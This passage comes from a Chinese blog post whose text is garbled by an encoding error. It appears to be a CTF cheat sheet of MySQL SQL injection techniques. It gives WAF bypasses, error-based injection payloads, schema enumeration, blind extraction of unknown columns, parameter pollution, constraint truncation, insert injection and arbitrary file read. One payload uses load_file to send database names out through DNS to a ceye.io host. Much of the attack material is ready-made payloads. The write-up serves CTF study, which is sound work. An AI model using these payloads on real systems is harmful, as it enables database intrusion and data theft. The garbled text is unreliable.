è¿‡æ»¤user()</span><br><span class="line">select user/**/()  //è¿™æ ·ä¸€æ ·èƒ½æ‰§è¡Œï¼Œä¸è¿‡è¿™æ ·è¿‡æ»¤çš„wafå€’æ˜¯å¾ˆå°‘è§ã€‚</span><br><span class="line"></span><br><span class="line">//æŠ¥é”™æ³¨å…¥</span><br><span class="line">1.floor()</span><br><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">2.updatexml() //5.1.5</span><br><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">3.extractvalue() //5.1.5</span><br><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br><span class="line"></span><br><span class="line">4.exp() //5.5.5ç‰ˆæœ¬ä¹‹åå¯ä»¥ä½¿ç”¨</span><br><span class="line">select host from user where user = &#x27;root&#x27; and Exp(~(select * from (select version())a));</span><br><span class="line"></span><br><span class="line">5.name_const //æ”¯æŒè€ç‰ˆæœ¬</span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line"></span><br><span class="line">6.geometrycollection()ï¼Œmultipoint()ï¼Œpolygon()ï¼Œmultipolygon()ï¼Œlinestring()ï¼Œmultilinestring() å‡ ä½•å‡½æ•°æŠ¥é”™</span><br><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br><span class="line">7.æœ‰æ—¶å€™æŠ¥é”™æ³¨å…¥æ˜¯å¯ä»¥æ ¹æ®åˆ—åæŠŠè¡¨åçˆ†å‡ºæ¥ # æ¯”å¦‚ 1&#x27;||polygon(passwd)</span><br><span class="line"></span><br><span class="line">//å®½å­—èŠ‚æ³¨å…¥å°±ä¸è¯´äº†ï¼Œåˆ«äººå†™å¤ªå¤šäº†</span><br><span class="line">%df é€ƒç¦»å•å¼•å·çš„è½¬ä¹‰</span><br><span class="line"></span><br><span class="line">//orè¢«è¿‡æ»¤ æˆ–è€… æ˜¯ informationä¸èƒ½ä½¿ç”¨çš„æƒ…å†µä¸‹</span><br><span class="line">ä¸€èˆ¬è€ƒç‚¹å¯èƒ½æ˜¯åŒè¡¨æŸ¥è¯¢ç›´æ¥åˆ‡å‰²ï¼Œæ¯”å¦‚ select * from flag where id=1 and mid(flag,1,1)=&#x27;f&#x27;</span><br><span class="line">è¿˜æœ‰å¯èƒ½è€ƒå¯Ÿ5.6.xä»¥ä¸Šç‰ˆæœ¬çš„æ–°ç‰¹æ€§ -&gt; åœ¨å…¶è‡ªå¸¦çš„ mysql åº“ä¸­ï¼Œæ–°å¢äº† innodb_table_stats å’Œ innodb_index_stats è¿™ä¸¤å¼ æ—¥å¿—è¡¨ã€‚å¦‚æœæ•°æ®è¡¨çš„å¼•æ“æ˜¯innodb ï¼Œåˆ™ä¼šåœ¨è¿™ä¸¤å¼ è¡¨ä¸­è®°å½•è¡¨ã€é”®çš„ä¿¡æ¯</span><br><span class="line">å…¶ä¸­ innodb_table_stats innodb_index_stats ç­‰åŒäº information_schema.tables  å½“ç„¶è¦æƒ³æ·±å…¥ç†è§£è¿˜æ˜¯ä¸‹è½½ä¸€ä¸ª5.6çš„æ•°æ®åº“ä»”ç»†çœ‹çœ‹</span><br><span class="line"></span><br><span class="line">//limit where è¢«è¿‡æ»¤ </span><br><span class="line">å¯ä»¥åˆ©ç”¨group by having æ¥åšé™åˆ¶æ¡ä»¶ï¼</span><br><span class="line">select uid,uname,passwd from admin group by passwd having uid=1;è¿™æ ·å°±èƒ½å¾—åˆ°ä¸€è¡Œæ•°æ® å¹¶ä¸”æœ‰whereä½œç”¨ï¼Œå½“ç„¶æ²¡æœ‰whereå’Œlimité‚£ä¹ˆæ–¹ä¾¿ï¼Œæ›´å¤šæ“ä½œè¿˜æœ‰å¾…å¼€æ”¾å‘¢ï¼</span><br><span class="line"></span><br><span class="line">//ç•ªå¤–ç¯‡ä¹‹æˆ‘çš„ç»éªŒ</span><br><span class="line">è¶Šæ¥è¶Šå¤šçš„ç”¨ xor ^ regexp è¿™äº›ä½œæ¯”è¾ƒ</span><br><span class="line">å¸¸ç”¨payload if(mid(sql)=&#x27;a&#x27;ï¼Œ1ï¼Œ0)</span><br><span class="line">å–„ç”¨ length() è¿™æ ·å°±çŸ¥é“æŸ¥è¯¢çš„æœªçŸ¥å­—æ®µæ˜¯å¤šå°‘é•¿åº¦ï¼Œå†™è„šæœ¬ä¹Ÿæ–¹ä¾¿ï¼Œä¹Ÿèƒ½ç›´æ¥çŒœæµ‹é•¿åº¦å¯¹åº”çš„å­—ç¬¦å¯èƒ½æ˜¯å•¥ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä¸Šé¢çš„è¿™äº›æ›¿æ¢ç»•è¿‡waf,æœ€ç»ˆæˆ‘ä»¬éœ€è¦æ‰§è¡Œæˆ‘ä»¬æ„é€ å‡ºæ¥çš„è¯­å¥æ¥è·å–flagï¼Œä¸€èˆ¬æ˜¯é€šè¿‡information_schemaè¡¨ï¼Œè¿™ä¸ªè¡¨ç›¸å½“äºä¸€ä¸ªå­—å…¸ï¼Œä¿å­˜äº†æ‰€æœ‰databaseçš„ä¿¡æ¯ã€‚</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">database() //è·å–å½“å‰æ•°æ®åº“</span><br><span class="line">//æŸ¥åº“</span><br><span class="line">select schema_name from information_Schema.schemata limit 1,1; </span><br><span class="line">//æŸ¥è¡¨</span><br><span class="line">select table_name from information_Schema.tables where table_schema=database() limit 1,1</span><br><span class="line">æŸ¥å­—æ®µ</span><br><span class="line">select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27; limit 0,1</span><br><span class="line">//</span><br></pre></td></tr></table></figure>

<h4 id="è¿˜æœ‰ä¸€äº›å°ä¼—çš„æŠ€å·§"><a href="#è¿˜æœ‰ä¸€äº›å°ä¼—çš„æŠ€å·§" class="headerlink" title="è¿˜æœ‰ä¸€äº›å°ä¼—çš„æŠ€å·§"></a>è¿˜æœ‰ä¸€äº›å°ä¼—çš„æŠ€å·§</h4><h5 id="æ— æ³•è·å–åˆ—åå¦‚ä½•å–æ•°æ®"><a href="#æ— æ³•è·å–åˆ—åå¦‚ä½•å–æ•°æ®" class="headerlink" title="æ— æ³•è·å–åˆ—åå¦‚ä½•å–æ•°æ®"></a>æ— æ³•è·å–åˆ—åå¦‚ä½•å–æ•°æ®</h5><p>1.æœ‰å›æ˜¾çš„order byè¿›è¡Œæ•°æ®çŒœæµ‹</p>
<table>
<thead>
<tr>
<th align="center">id</th>
<th align="center">username</th>
<th align="center">xxxxxx</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">admin</td>
<td align="center">flag{this_is_flag}</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">admin2</td>
<td align="center">1</td>
</tr>
</tbody></table>
<p>å¦‚ä¸Šä¸€ä¸ªæ•°æ®è¡¨flagï¼Œå½“æˆ‘ä»¬é€šè¿‡informationè¡¨è·å–åˆ°äº†è¡¨æ˜å’Œæœ‰å¤šå°‘åˆ—ï¼Œä½†æ˜¯æ­»æ´»ä¸çŸ¥é“æœ€åä¸€åˆ—åˆ—åï¼Œé‚£ä¹ˆæ€ä¹ˆæŸ¥ï¼Ÿ</p>
<p>å¦‚æœæ˜¯æœ‰å›æ˜¾çš„æ³¨å…¥å¯ä»¥è¿™æ ·</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;fl&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æˆ‘ä»¬çš„è”åˆæŸ¥è¯¢çš„ç¬¬ä¸‰åˆ—æ¥ä¸€æ­¥ä¸€æ­¥çš„æ¯”å¯¹å‡ºflagæ˜¯ä»€ä¹ˆå­—ç¬¦ä¸²ã€‚ä¸¾ä¸ªä¾‹å­ï¼š<br>æ¯”å¦‚æˆ‘ä»¬çš„æ˜¾ç¤ºä½æ˜¯3é‚£ä¹ˆï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;fl&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å¦‚æœæˆ‘ä»¬çš„flæ˜¾ç¤ºå‡ºæ¥é‚£ä¹ˆè¯´æ˜ï¼Œå®ƒä¸‹é¢çš„å­—æ®µåº”è¯¥æ˜¯fl+å­—ç¬¦ï¼Œæ³¨æ„è¿™é‡Œå¿…é¡»ä¸€ä½ä¸€ä½çš„å»å°è¯•ã€‚å½“ç„¶è¿™ä¸ªæ–¹æ³•å±€é™æ€§å¾ˆå¤§ï¼Œè¿˜å¾ˆéº»çƒ¦ã€‚</p>
<p>2.å¤§å¤šçš„æ—¶å€™æ˜¯ç›²æ³¨ï¼Œé‚£å°±å¯ä»¥ä½¿ç”¨ä¸‰è¡¨è”åˆæŸ¥è¯¢æ³•ï¼š<br>ç½‘ä¸Šçš„ä¸‰è¡¨è”åˆæŸ¥è¯¢æ³•æ€»æ˜¯è®²ä¸æ¸…æ¥šï¼Œä¸‹é¢æˆ‘ä»¬æ¥åˆ†è§£ä¸‹ï¼Œä½ ä¸ç”¨ææ¸…æ¥šä»€ä¹ˆæ˜¯ä¸‰è¡¨è”åˆæŸ¥è¯¢ï¼Œä½ åªéœ€ææ¸…æ¥šæ¯ä¸€æ­¥æ˜¯ä»€ä¹ˆæ„æ€å³å¯ã€‚<br>é¦–å…ˆæˆ‘ä»¬æ„é€ ä¸€åˆ—ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1  </span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„è¯­å¥å›¾å½¢åŒ–æŸ¥è¯¢ç»“æœå¦‚è¡¨</p>
<table>
<thead>
<tr>
<th align="center">c1</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
</tr>
</tbody></table>
<p>æˆ‘ä»¬éœ€è¦ä¸Šé¢è¿™æ ·çš„åˆ—ä¸‰ä¸ªï¼Œå› ä¸ºç›®æ ‡è¡¨çš„åˆ—æ˜¯ä¸‰ä¸ªï¼ˆå¦‚æœç›®æ ‡è¡¨æŸ¥è¯¢çš„æ˜¯äº”åˆ—ï¼Œæˆ‘ä»¬å°±éœ€è¦æ„é€ äº”åˆ—ï¼‰<br>ç„¶åæˆ‘ä»¬æŠŠåˆ—ç»„åˆåœ¨ä¸€èµ·</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3</span><br></pre></td></tr></table></figure>
<p>ç»“æœå°±æ˜¯ä¸‹é¢è¿™æ ·</p>
<table>
<thead>
<tr>
<th align="center">c1</th>
<th align="center">c2</th>
<th align="center">c3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2</td>
<td align="center">3</td>
</tr>
</tbody></table>
<p>ç„¶åæˆ‘ä»¬è”åˆæŸ¥è¯¢flagæ•°æ®è¡¨</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹</p>
<table>
<thead>
<tr>
<th align="center">c1</th>
<th align="center">c2</th>
<th align="center">c3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">admin</td>
<td align="center">flag{this_is_flag}</td>
</tr>
</tbody></table>
<p>ç°åœ¨æˆ‘ä»¬æŠŠä¸Šé¢è¿™ä¸ªè¯­å¥æŸ¥è¯¢å‡ºæ¥çš„è¡¨å‘½åä¸ºtï¼Œç„¶åæˆ‘ä»¬æŸ¥è¯¢è¿™ä¸ªè¡¨çš„c3å­—æ®µ,å¹¶å–ç¬¬äºŒè¡Œçš„æ•°æ®</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> t.c3 <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>)t limit <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±æˆåŠŸå¾—åˆ°flagäº†</p>
<table>
<thead>
<tr>
<th align="center">c3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">flag{this_is_flag}</td>
</tr>
</tbody></table>
<p>å½“ç„¶ç›²æ³¨æˆ‘ä»¬æ˜¯ä¸èƒ½çœ‹åˆ°çš„ï¼Œæ‰€ä»¥è¿˜éœ€è¦midæˆ–è€…substrè¿›è¡Œåˆ‡å‰²ï¼Œæœ€ç»ˆæˆ‘ä»¬å†™è„šæœ¬æ¥è¿›è¡ŒæœªçŸ¥åˆ—åçš„æ•°æ®è¯»å–ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mid((<span class="keyword">select</span> t.c2 <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)t limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;f&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>ä»ä¸Šé¢çœ‹æˆ‘ä»¬å¹¶æ²¡æœ‰ç”¨ç¬¬ä¸‰åˆ—çš„åˆ—åä½†æ˜¯æˆåŠŸæŠŠç¬¬ä¸‰åˆ—çš„æ•°æ®å–äº†å‡ºæ¥ï¼Œè¿™å°±æ˜¯ä¸‰è”è¡¨æŸ¥è¯¢ã€‚å¾ˆç®€å•å§ã€‚</p>
<h5 id="HTTPå‚æ•°æ±¡æŸ“"><a href="#HTTPå‚æ•°æ±¡æŸ“" class="headerlink" title="HTTPå‚æ•°æ±¡æŸ“"></a>HTTPå‚æ•°æ±¡æŸ“</h5><p>ä»€ä¹ˆæ˜¯å‚æ•°æ±¡æŸ“ï¼Ÿæ¯”å¦‚URLï¼š<a href="http://www.xxxx.com/search.php?id=110&amp;id=911">http://www.xxxx.com/search.php?id=110&amp;id=911</a><br>ç™¾åº¦ä¼šç†è§£æˆè®©ç™¾åº¦æœç´¢ï¼š110                  #é€‰æ‹©äº†ç¬¬ä¸€ä¸ªå‚æ•°,æ”¾å¼ƒäº†ç¬¬äºŒä¸ªå‚æ•°ã€‚<br>é›…è™ä¼šç†è§£æˆè®©é›…è™æœç´¢ï¼š911ã€€ã€€           #é€‰æ‹©äº†ç¬¬äºŒä¸ªå‚æ•°,æ”¾å¼ƒäº†ç¬¬ä¸€ä¸ªå‚æ•°ã€‚<br>è°·æ­Œä¼šç†è§£æˆè®©è°·æ­Œæœç´¢ï¼š110 911           #ä¸¤ä¸ªå‚æ•°åŒæ—¶é€‰æ‹©ã€‚<br>ä¸»è¦çš„å°±æ˜¯è¿™ä¸‰ç§æƒ…å†µäº†ã€‚<br>è¿™ä¸»è¦æ˜¯æºäº,ä¸åŒçš„ç½‘ç«™å¯¹å¤„ç†å‚æ•°çš„å¤„ç†æ–¹å¼ä¸åŒ<br>å€˜è‹¥æ˜¯ç¬¬ä¸‰ç§æƒ…å†µ,ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°å–ç¬¬äºŒä¸ªå‚æ•°ä¹Ÿå–ã€‚é‚£ä¹ˆå¤§å®¶è¯·çœ‹ä¸‹é¢çš„URL<br><a href="http://www.xishaonian.com/hello.php?id=select">http://www.xishaonian.com/hello.php?id=select</a> 1&amp;id&#x3D;2,3,3 from admin<br>è¯¥ç§æƒ…å†µè¿˜å¯ç”¨äºBypass WAF.</p>
<h5 id="DNSlogsqlæ³¨å…¥"><a href="#DNSlogsqlæ³¨å…¥" class="headerlink" title="DNSlogsqlæ³¨å…¥"></a>DNSlogsqlæ³¨å…¥</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\aa.&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;. vd85lw.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºè®¿é—®aa.ctf.yygta1.ceye.io DNSä¼šè®°å½•ä¸‹è¿™ä¸ªè®°å½•ï¼æ³¨æ„ç½‘ä¸Šçš„payloadçš„concatå\ä¼šæŠŠå•å¼•å·è½¬ä¹‰å¯¼è‡´é‚£ä¸ªå¹¶ä¸å¥½ç”¨ï¼Œå°±ä¸Šé¢è¿™ä¸ªå°±æŒºå¥½ç”¨çš„<br>æ¨èçš„å¹³å°ï¼š<a href="http://ceye.io/">http://ceye.io/</a></p>
<h5 id="mssql-mysql"><a href="#mssql-mysql" class="headerlink" title="mssql+mysql"></a>mssql+mysql</h5><p>mssql+mysql å¯ä»¥åœ¨mssqlä¸­æ‰§è¡Œmysqlçš„æŸ¥è¯¢è¯­å¥ï¼š<br>å‚è€ƒä¸ªé“¾æ¥å§ æ²¡ç»†è‡´ç ”ç©¶,åªæ˜¯è§è¿‡<br><a href="https://docs.microsoft.com/zh-tw/sql/t-sql/functions/openquery-transact-sql?view=sql-server-2017">https://docs.microsoft.com/zh-tw/sql/t-sql/functions/openquery-transact-sql?view=sql-server-2017</a></p>
<h5 id="MYSQLçº¦æŸæ”»å‡»ï¼š"><a href="#MYSQLçº¦æŸæ”»å‡»ï¼š" class="headerlink" title="MYSQLçº¦æŸæ”»å‡»ï¼š"></a>MYSQLçº¦æŸæ”»å‡»ï¼š</h5><p>å¯¹äºé•¿åº¦æœ‰é™åˆ¶çš„å­—ç¬¦ä¸²å¦‚æœæ’å…¥è¶…è¿‡å®šä¹‰çš„é•¿åº¦ä¼šè‡ªåŠ¨æˆªæ–­ï¼š<br>æ¯”å¦‚ useråˆ—åé•¿åº¦10 æˆ‘ä»¬æ³¨å†Œadmin admin è‚¯å®šä¸è¡Œï¼Œè¿™æ˜¯ç®¡ç†å‘˜çš„è´¦æˆ·<br>å¦‚æœæˆ‘ä»¬æ³¨å†Œadmin+++++++++++++++ admin12345<br>é‚£ä¹ˆæˆ‘ä»¬ä»ç„¶å¯ä»¥ç”¨admin12345ç™»é™†adminè´¦å·åŸå› æ˜¯+ä¼šå˜æˆç©ºæ ¼ è¿™åœ¨å‰ç«¯å’Œéƒ½ç«¯éªŒè¯ä¸­éƒ½ä¼šé€šè¿‡<br>ä¾‹é¢˜ï¼š bugkuçš„ä¸€é“CTFé¢˜,åœ°å€:<a href="http://47.93.190.246:49163/">http://47.93.190.246:49163/</a></p>
<h5 id="mysqlçš„å¼±ç±»å‹-æ³¨å…¥"><a href="#mysqlçš„å¼±ç±»å‹-æ³¨å…¥" class="headerlink" title="mysqlçš„å¼±ç±»å‹-æ³¨å…¥"></a>mysqlçš„å¼±ç±»å‹-æ³¨å…¥</h5><p>mysqlå’Œphpä¸€æ ·éƒ½æ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œä½ å¯ä»¥å°è¯•select 0&#x3D;â€™sadasâ€™ ç»“æœä¸€å®šæ˜¯1ï¼Œè¿™é‡Œä¸ç”¨ç‰¹æ®Šè®°å¿†ï¼Œphpä¼šè¿”å›trueçš„mysqléƒ½ä¼šè¿”å›trueï¼Œç”±äºè¿™ç§å¼±ç±»å‹ï¼Œè¿˜è¡ç”Ÿäº†ä¸€ç‚¹å¼±ç±»å‹æ³¨å…¥çš„æŠ€å·§ã€‚<br>æ¯”å¦‚ä¸€ä¸ªæ³¨å†Œçš„insert æ³¨å…¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">email<span class="operator">=</span><span class="number">6677</span><span class="operator">%</span><span class="number">40</span>qq.com<span class="operator">&amp;</span>username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%2bsubstr((select hex(hex((select t.c from (select (select 1)c union select * from flag limit 1 offset 1)t)))) from 20)%2b&#x27;</span><span class="number">0</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>isertæ³¨å…¥é€šè¿‡ç™»å½•åçš„ç”¨æˆ·åæ¥çœ‹å›æ˜¾ ä¸ºäº†æœ‰å›æ˜¾ æˆ‘ä»¬ 0â€™+hex(hex(è¯­å¥))+â€™0  ç”±äºå¼±ç±»å‹åŠ å¼ºåˆ¶è½¬æ¢ æˆ‘ä»¬çš„usernameå°±æˆä¸ºäº†æˆ‘ä»¬æ³¨å…¥æ•°æ®çš„ä¸¤æ¬¡ hexå€¼ï¼ˆæ³¨æ„è¿™é‡Œå¿…é¡»ç”¨%2b +å¯èƒ½è¢«å½“æˆç©ºæ ¼æˆ–è€…%20 æ‰€ä»¥å…ˆç¼–ç  æµè§ˆå™¨è‡ªå·±ä¼šè§£ç è¿™æ ·å°±ä¸ä¼šäº§ç”Ÿæ­§ä¹‰ï¼‰ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å‘¢ï¼Œå°±åƒâ€™0â€™+user()+â€™0â€™ ,ä¸å¥½æ„æ€è¿™æ ·åªä¼šè¿”å›0 å› ä¸ºâ€+â€åªé€‚åˆæ•´æ•°ç›¸åŠ ,ä¸é€‚åˆå­—ç¬¦ä¸²ã€‚<br>ä¸¤æ¬¡ hexæ˜¯ä¸ºäº†æœç» 0+33a1df+0&#x3D;33è¿™ç§æƒ…å†µï¼Œä¸ºçš„æ˜¯æŠŠæ•°å€¼å˜æˆå­—ç¬¦å¼€å¤´è€Œä¸æ˜¯æ•°å­—å¼€å¤´çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚è¿™æ ·æˆ‘ä»¬å¾—åˆ°çš„ç”¨æˆ·åå°±æ˜¯æˆ‘ä»¬æŸ¥è¯¢ç»“æœçš„ä¸¤æ¬¡åå…­è¿›åˆ¶ç¼–ç ã€‚</p>
<h5 id="åŒè¡¨æŸ¥è¯¢"><a href="#åŒè¡¨æŸ¥è¯¢" class="headerlink" title="åŒè¡¨æŸ¥è¯¢"></a>åŒè¡¨æŸ¥è¯¢</h5><p>æœ‰æ—¶å€™information æˆ–è€… orã€select è¢«è¿‡æ»¤ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•ç›´æ¥æŸ¥è¯¢information_schemaä¸­çš„åº“åå’Œè¡¨åã€‚è¿™ä¸ªæ—¶å€™å¯èƒ½é¢˜ç›®å°±æ²¡æƒ³è®©æˆ‘ä»¬å»information_Schemaä¸­æ‰¾ä¸œè¥¿ã€‚åº”è¯¥å°è¯•åŒè¡¨æŸ¥è¯¢ï¼Œè¿˜æ‹¿ä¸Šé¢çš„flagè¡¨ä¸¾ä¾‹ï¼Œå¦‚æœæ³¨å…¥è¯­å¥åªæ˜¯æŸ¥è¯¢usernameï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> mid(flag,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;f&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>åŒè¡¨æ˜¯ç›´æ¥å¯ä»¥æŸ¥çš„ï¼Œç›´æ¥åˆ‡å°±è¡Œï¼Œæœ‰æ—¶å€™è¿™ä¸ªæŠ€å·§è¿˜å¬å¸¸ç”¨ã€‚</p>
<h5 id="mysql-å¦ç±»æ”»å‡»"><a href="#mysql-å¦ç±»æ”»å‡»" class="headerlink" title="mysql å¦ç±»æ”»å‡»"></a>mysql å¦ç±»æ”»å‡»</h5><p>æœ‰æ—¶å€™sqlæ³¨å…¥ä¸æ˜¯å•ç‹¬å‡ºç°çš„ï¼Œæ¯”å¦‚ç»“åˆphpçš„å¼±ç±»å‹ï¼Œåœ¨ç™»é™†çš„æ—¶å€™å¸Œæœ›usernameè¿”å›ä¸€ä¸ªnullï¼Œæ¥è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒï¼Œé‚£ä¹ˆmysqlæ³¨å…¥ä¹Ÿå¯ä»¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> flag <span class="keyword">group</span> <span class="keyword">by</span> username <span class="keyword">with</span> <span class="keyword">rollup</span></span><br></pre></td></tr></table></figure>
<p>å›¾å½¢æŸ¥è¯¢ç»“æœï¼š</p>
<table>
<thead>
<tr>
<th align="center">username</th>
</tr>
</thead>
<tbody><tr>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">null</td>
</tr>
</tbody></table>
<p>å¯ä»¥é€šè¿‡limit æ¥è¿”å›ä¸€ä¸ªnullã€‚å½“ç„¶è¿™ä¸ªæŠ€å·§å¾ˆå°‘ç”¨ã€‚</p>
<h5 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h5><p>AllowArbitraryServer å¼€å¯çš„æƒ…å†µä¸‹å¼€å¯çš„æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥æŠŠæœ¬åœ°æ–‡ä»¶è¯»å–åˆ°è¿œç¨‹mysqlæœåŠ¡å™¨ä¸Šï¼Œå…·ä½“æ“ä½œæ˜¯vpså¯åŠ¨mysqlæœåŠ¡å™¨ç”¨phpmyadminçš„åå°ç™»é™†å»ç™»é™†æˆ‘ä»¬çš„mysqlæœåŠ¡å™¨ï¼Œæˆ‘ä»¬çš„æœåŠ¡å™¨å°±ä¼šè®°å½•ä¸‹æˆ‘ä»¬æ‰€éœ€è¦çš„æ–‡ä»¶ï¼Œå½“ç„¶vpsçš„mysqlæœåŠ¡å™¨éœ€è¦é…ç½®ï¼Œä¸»è¦ç”¨åœ¨phpmyadminç•Œé¢çš„ç™»é™†ä¸­ï¼Œå†™èµ·æ¥å¤ªé•¿äº†ï¼Œç›´æ¥ç»™ä¸ªé“¾æ¥å§ã€‚<br><a href="https://bbs.pediy.com/thread-248424.htm">https://bbs.pediy.com/thread-248424.htm</a></p>
